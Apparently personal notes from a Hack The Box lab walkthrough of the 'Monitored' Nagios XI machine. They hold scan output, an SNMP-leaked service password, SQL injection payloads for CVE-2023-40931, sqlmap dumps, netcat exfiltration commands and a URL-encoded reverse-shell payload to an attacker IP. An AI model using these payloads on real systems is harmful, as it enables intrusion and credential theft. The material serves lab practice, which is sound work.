# NMAP


```
Nmap scan report for 10.129.184.68              
Host is up (0.56s latency).                      
Not shown: 996 closed tcp ports (reset) 
PORT    STATE SERVICE                   
22/tcp  open  ssh                     
| ssh-hostkey:                                     
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp  open  http                         
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp open  ldap                       
443/tcp open  https                    
| tls-alpn:    
|_  http/1.1                    
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_ssl-date: TLS randomness does not represent time
|_http-title: Nagios XI   
                                                     
Nmap done: 1 IP address (1 host up) scanned in 17.88 seconds
                                                     
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-13 20:39 CET
Nmap scan report for nagios.monitored.htb (10.129.184.68)
Host is up (0.43s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       namingContexts: dc=monitored,dc=htb
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema
| ldap-search: 
|   Context: dc=monitored,dc=htb
|     dn: dc=monitored,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: monitored.htb
|_        dc: monitored
443/tcp open  ssl/http Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.71 seconds
```

```
sudo nmap 10.129.184.68 -sU
[sudo] password for angelo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-14 08:17 CET
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for nagios.monitored.htb (10.129.184.68)
Host is up (0.49s latency).
Not shown: 992 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
123/udp   open          ntp
161/udp   open          snmp
162/udp   open|filtered snmptrap
689/udp   open|filtered nmap
16816/udp open|filtered unknown
17638/udp open|filtered unknown
22799/udp open|filtered unknown

```

# USER 

```bash
tar czf /tmp/compressed.tar.gz metabase.db
receive file: nc -l -p 12344 > metabase.tar.gz
send file: nc 10.10.16.28 12344 < compressed.tar.gz
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```

`ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/nagiosxi/FUZZ' -fs 404 -r`

```
help                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 647ms]
tools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 470ms]
mobile                  [Status: 200, Size: 1597net-snmp8, Words: 2562, Lines: 225, Duration: 339ms]
admin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 468ms]
reports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 368ms]
account                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 413ms]
includes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 345ms]
backend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 258ms]
db                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 167ms]
api                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 246ms]
config                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 243ms]
views                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 481ms]
sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 573ms]
terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 216ms]
                        [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 432ms]
```

`ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/FUZZ' -fs 404 -r -e php,html,js `

```
javascript              [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 214ms]
nagios                  [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 300ms]
                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 249ms]
```


```
[ldap-anonymous-login] [tcp] [medium] nagios.monitored.htb:389
```

`yay -S openldap`
`yay -S net-snmp`

```
SNMP's primary purpose is to provide network administrators with a tool for managing, monitoring, and controlling various pieces of equipment on their networks. It does this by providing the means to configure settings, poll performance data from managed devices, and receive alerts (traps) from those devices when certain conditions are met. 


SNMPv1, the first version, introduced basic network-management capabilities but had significant security deficiencies like sending data, including community strings, in plaintext.
```

`snmpwalk -c public 10.129.184.68 -v1`

```
HOST-RESOURCES-MIB::hrSWRunParameters.425 = STRING: "--config /etc/laurel/config.toml"         
HOST-RESOURCES-MIB::hrSWRunParameters.511 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.530 = STRING: "-f"                                                                                                                                       
HOST-RESOURCES-MIB::hrSWRunParameters.531 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"                                                      
HOST-RESOURCES-MIB::hrSWRunParameters.533 = STRING: "-n -iNONE"                                
HOST-RESOURCES-MIB::hrSWRunParameters.535 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.536 = STRING: "-u -s -O /run/wpa_supplicant"             
HOST-RESOURCES-MIB::hrSWRunParameters.539 = STRING: "-f"         
HOST-RESOURCES-MIB::hrSWRunParameters.561 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
HOST-RESOURCES-MIB::hrSWRunParameters.596 = STRING: "-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
HOST-RESOURCES-MIB::hrSWRunParameters.699 = STRING: "-f /usr/local/nagios/etc/pnp/npcd.cfg"
HOST-RESOURCES-MIB::hrSWRunParameters.705 = STRING: "-LOw -f -p /run/snmptrapd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.726 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.732 = STRING: "-o -p -- \\u --noclear tty1 linux"                                                                                                        
HOST-RESOURCES-MIB::hrSWRunParameters.734 = ""                                                                                                                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.745 = STRING: "-p /var/run/ntpd.pid -g -u 108:116"
HOST-RESOURCES-MIB::hrSWRunParameters.787 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
HOST-RESOURCES-MIB::hrSWRunParameters.788 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
HOST-RESOURCES-MIB::hrSWRunParameters.828 = STRING: "-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf"
HOST-RESOURCES-MIB::hrSWRunParameters.874 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.875 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.876 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.877 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.878 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.879 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.885 = ""                                                 
HOST-RESOURCES-MIB::hrSWRunParameters.886 = STRING: "-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d"
HOST-RESOURCES-MIB::hrSWRunParameters.897 = STRING: "-k start"  
HOST-RESOURCES-MIB::hrSWRunParameters.906 = STRING: "/usr/sbin/snmptt --daemon"
HOST-RESOURCES-MIB::hrSWRunParameters.907 = STRING: "/usr/sbin/snmptt --daemon"
HOST-RESOURCES-MIB::hrSWRunParameters.942 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
HOST-RESOURCES-MIB::hrSWRunParameters.946 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
HOST-RESOURCES-MIB::hrSWRunParameters.947 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.948 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.949 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.950 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.1335 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
HOST-RESOURCES-MIB::hrSWRunParameters.1345 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
HOST-RESOURCES-MIB::hrSWRunParameters.1346 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
HOST-RESOURCES-MIB::hrSWRunParameters.1377 = STRING: "-bd -q30m"
```

```
The specified user account has been disabled or does not exist.
```

login on `https://nagios.monitored.htb/nagios` using svc found credentials

https://outpost24.com/blog/nagios-xi-vulnerabilities/

`Version 4.4.13 in Nagios XI`

`CVE-2023-48085`

```
Nagios XI before version 5.11.3 was discovered to contain a remote code execution (RCE) vulnerability via the component command_test.php.
```

`ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/nagiosxi/api/FUZZ' -fc 404`

```
v1                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 116ms]
```


`ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ' -fs 32`

```
authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 824ms]
```

https://support.nagios.com/forum/viewtopic.php?f=16&t=58783


```
POST /nagiosxi/api/v1/authenticate HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=e8jjiqbkgg8nv17301b371f9tc
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded

username=svc&password=XjH7VCehowpR1xZB&valid_min=500
```

```
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "bfeeabf6909bd4725bba83dee039f05194b8fadc",
    "valid_min": 5,
    "valid_until": "Sun, 14 Jan 2024 11:40:19 -0500"
}
```
cmd=migrate&address=aaaaaaaaaaa&username=%52%65%73%65%61%72%63%68%0a%20%20%6e%61%6d%65%3a%20%22%7b%7b%20%6c%6f%6f%6b%75%70%28%5c%22%70%69%70%65%5c%22%2c%20%5c%22%6e%63%20%31%30%2e%31%30%2e%31%36%2e%32%38%20%31%32%33%34%35%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%5c%22%29%20%7d%7d%22&password=test&overwrite=1&nagios_cfg=

`https://github.com/tgoetheyn/Docker-NagiosXI`

```
POST /nagiosxi/login.php?token=fe73bcd16a50b95ce7818c2ea296842fb8246fc3 HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=t9v0qd54agapr2li325npkge7o
Content-Length: 151
Cache-Control: max-age=0
Authorization: Basic c3ZjOlhqSDdWQ2Vob3dwUjF4WkI=
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://nagios.monitored.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://nagios.monitored.htb/nagiosxi/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

nsp=ad605fa6b1164f582f70dd537421061cc3824ad58c48232de8addc92fec0124c&page=auth&debug=&pageopt=login&username=svc&password=XjH7VCehowpR1xZB&loginButton=
```


authorization bearer is from `/nagios` what is important is the cookie, but remember to accept everytime the new cookie assigned by the server with set-cookie when you perform a new login, otherwise it won't work.

`Nagios XI 5.11.0`

https://outpost24.com/blog/nagios-xi-vulnerabilities/#h-the-four-vulnerabilities

```
CVE-2023-40931

A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php

action=acknowledge_banner_message&id=3
```

```
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=nrtupe62qo38b6rnimiv0ipc8b
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

action=acknowledge_banner_message&id=(select+sleep(5))%23
```

```
sqlmap -r $(pwd)/request.txt --random-agent --fresh-queries --batch -p id  --force-ssl 
```

sql injection confirmed also with error functions:

```
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=nrtupe62qo38b6rnimiv0ipc8b
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 198

action=acknowledge_banner_message&id=(SELECT+extractvalue(rand(),concat(0x3a,(SELECT+concat(CHAR(126),table_name,CHAR(126))+FROM+information_schema.tables+where+table_schema=database()+LIMIT+1,1))))
```

we can extract data manually, i'll do with salmap to speed up.

```
sqlmap -r $(pwd)/request.txt --random-agent --fresh-queries --batch -p id  --force-ssl --dbs -D nagiosxi --dump
```

```
[16 entries]
+------------+----------------------------+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------+-----------------+---------------------+---------------------+
| session_id | session_phpid              | session_user_id | session_data                                                                                                                                                                                                                                     | session_page                                          | session_address | session_created     | session_last_active |
+------------+----------------------------+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------+-----------------+---------------------+---------------------+
| 22242      | 1pgu94gfdnjiooon9ectm95v1i | 1               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czozOiJHRVQiO3M6MTI6InJlcXVlc3RfdGltZSI7aToxNjk5NzM0Mjc4O3M6MjA6InJlcXVlc3RfcXVlcnlfc3RyaW5nIjtzOjI1OiJjbWRfdHlwPTQ3Jmhvc3Q9SE9TVCtOQU1FIjtzOjEzOiJyZXF1ZXN0X2h0dHBzIjtpOjA7fQ==                             | /nagiosxi/includes/components/nagioscore/ui/cmd.php   | 10.10.14.48     | 2023-11-11 15:21:34 | 2023-11-11 15:24:38 |
| 22243      | hgdig8fc62n8r1i9nv20r96q20 | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czozOiJHRVQiO3M6MTI6InJlcXVlc3RfdGltZSI7aToxNjk5NzM0ODY4O3M6MjA6InJlcXVlc3RfcXVlcnlfc3RyaW5nIjtzOjQ2OiJ0b2tlbj1jMjAxZTdiOWViY2E0Y2UxYTk4ZDU3ZTA2NDEwNTAwOThlYmMzOTI4IjtzOjEzOiJyZXF1ZXN0X2h0dHBzIjtpOjA7fQ== | /nagiosxi/includes/components/autodiscovery/index.php | 127.0.0.1       | 2023-11-11 15:34:28 | 2023-11-11 15:34:28 |
| 22244      | 2so7haapjhfsd7uj6ugbsg0alm | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czozOiJHRVQiO3M6MTI6InJlcXVlc3RfdGltZSI7aToxNjk5NzM0OTM3O3M6MjA6InJlcXVlc3RfcXVlcnlfc3RyaW5nIjtzOjQ2OiJ0b2tlbj03OTIwOGZlNTVjOGQ5NTUzNzI5YjNiN2Y2MDMzNTFiYjBjZDU0ZmVmIjtzOjEzOiJyZXF1ZXN0X2h0dHBzIjtpOjA7fQ== | /nagiosxi/includes/components/autodiscovery/index.php | 127.0.0.1       | 2023-11-11 15:35:37 | 2023-11-11 15:35:37 |
| 22245      | 7hph1qa28vf6a62o37gdgqinfc | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czozOiJHRVQiO3M6MTI6InJlcXVlc3RfdGltZSI7aToxNjk5NzM0OTM5O3M6MjA6InJlcXVlc3RfcXVlcnlfc3RyaW5nIjtzOjQ2OiJ0b2tlbj1hYzlkZDBjODJkMDY5MGY2YjcwNDY2OGExZDlmYTAwZGRiYjU4MjJlIjtzOjEzOiJyZXF1ZXN0X2h0dHBzIjtpOjA7fQ== | /nagiosxi/includes/components/autodiscovery/index.php | 127.0.0.1       | 2023-11-11 15:35:39 | 2023-11-11 15:35:39 |
| 22246      | oprc6i3kgkod155cgabkal3183 | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czozOiJHRVQiO3M6MTI6InJlcXVlc3RfdGltZSI7aToxNjk5NzM1MDcwO3M6MjA6InJlcXVlc3RfcXVlcnlfc3RyaW5nIjtzOjQ2OiJ0b2tlbj01NjdhOTVmZGQ4NTllMGM5OTNlMDU3ZTUzOGIzZWQzYzQzNGVkYmZhIjtzOjEzOiJyZXF1ZXN0X2h0dHBzIjtpOjA7fQ== | /nagiosxi/includes/components/actions/runcmd.php      | 127.0.0.1       | 2023-11-11 15:37:50 | 2023-11-11 15:37:50 |
| 22247      | 235lvtb5r2ddkn2gjo7vilhgmq | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czozOiJHRVQiO3M6MTI6InJlcXVlc3RfdGltZSI7aToxNjk5NzM1MjE4O3M6MjA6InJlcXVlc3RfcXVlcnlfc3RyaW5nIjtzOjQ2OiJ0b2tlbj1mMDNlNDJmZGM4NmZlNWMzNDYyMTgyNmE0ODBkZjFiNWIyZTlhYmU3IjtzOjEzOiJyZXF1ZXN0X2h0dHBzIjtpOjA7fQ== | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:40:18 | 2023-11-11 15:40:18 |
| 22248      | c72imdi5pathue3rof5i7odkhg | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTIzNDtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49YTE4MjhmMDJiZDUxZjMyMzhjZGNkODdlMTQ2MzRjYjcwMmFjNTQ5NyI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:40:34 | 2023-11-11 15:40:34 |
| 22249      | q1utl558sbuiihgcu5q007q89t | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTI1ODtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49M2I4MDg3OWJhYjE3NmU2NzBkZjQzMGM1OTViNmVmZmQ4NWI5Yzg1NyI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:40:58 | 2023-11-11 15:40:58 |
| 22250      | 6sl7ddmm9q7miv4tdjrsubb8b8 | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTMyMDtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49MjNkODZhNGEzY2JhNGYzODYyYzU0NTI5M2FmNzJiNjFlMTRiNGUyMiI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:42:00 | 2023-11-11 15:42:00 |
| 22251      | 74t7imn7gdoa7i3d40sjd94fjf | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTM1NDtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49ZmIxNzFjNzM5ZTQzOWJhYzlmNTYxMGFiNzkxMjRiN2QxYjAxZTM2MiI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:42:34 | 2023-11-11 15:42:34 |
| 22252      | 38sckrp6lpdriv3bpdip4htp5k | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTM2NTtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49YzExYjNiNDA4YmRjZTk4OGJiN2E4MDRiMjU1MGQwMDAzYTZjODQ4NSI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:42:45 | 2023-11-11 15:42:45 |
| 22253      | bn69phmtoq6376dchmsf2tk112 | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTQyMTtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49NWU5M2ViYTA0NWVmYjlmNGFmMWFjZDllNGUzOWQ2MmMwYjYzYzk5NSI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:43:41 | 2023-11-11 15:43:41 |
| 22254      | hn8k6thdbpcdbsk2jlk6qdjuls | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTU1MztzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49NWJkYTBkZDQ4YTdhZTNlZjU1OTM1MTQ2MDNkNGU4ZmNiOWRjYjU1OCI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:45:53 | 2023-11-11 15:45:53 |
| 22255      | hvi6vg6u0e3ic9s0sb592kshqf | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTU1NDtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49OWI1MzUxZmU1NDAxNDhmN2Y3Y2ZmNzgxZjg4MWFlNTQ3ZWVkYTAxYyI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:45:54 | 2023-11-11 15:45:54 |
| 22256      | 1h1fv32cgkrqh8uqic4qoh7g6u | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTU1NjtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49OTg4MGJiYmUxNTUxZDlhNGNmOWQ5NGM1YjI3ODg3ZmI0ZTZmZGI1NCI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:45:56 | 2023-11-11 15:45:56 |
| 22257      | foroie8ov5nbi5j95bmc3d79ri | 2               | YTo0OntzOjE0OiJyZXF1ZXN0X21ldGhvZCI7czo0OiJQT1NUIjtzOjEyOiJyZXF1ZXN0X3RpbWUiO2k6MTY5OTczNTU3MDtzOjIwOiJyZXF1ZXN0X3F1ZXJ5X3N0cmluZyI7czo0NjoidG9rZW49YjAwZWQ4ZDY2NmRkYTgyZjZlNmFkOGIyZDFhNTZjNzM2ZmZhYWYwMSI7czoxMzoicmVxdWVzdF9odHRwcyI7aTowO30= | /nagiosxi/includes/components/xicore/api.php          | 127.0.0.1       | 2023-11-11 15:46:10 | 2023-11-11 15:46:10 |
+------------+----------------------------+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------+-----------------+---------------------+---------------------+
```

nothing useful. session do not work. in `xi_users` table however we have session api which following the documentation (installing an instance of nagios before `5.11.1`), should let us to create a new admin accout.

api key manual enumeration


```
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=sgpup78cc4d6678th3kt12oqlk
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 134

action=acknowledge_banner_message&id=updatexml(null,concat(0x0a,(select+substring(api_key,62,31)+from+xi_users+where+user_id=1)),null)
```

```
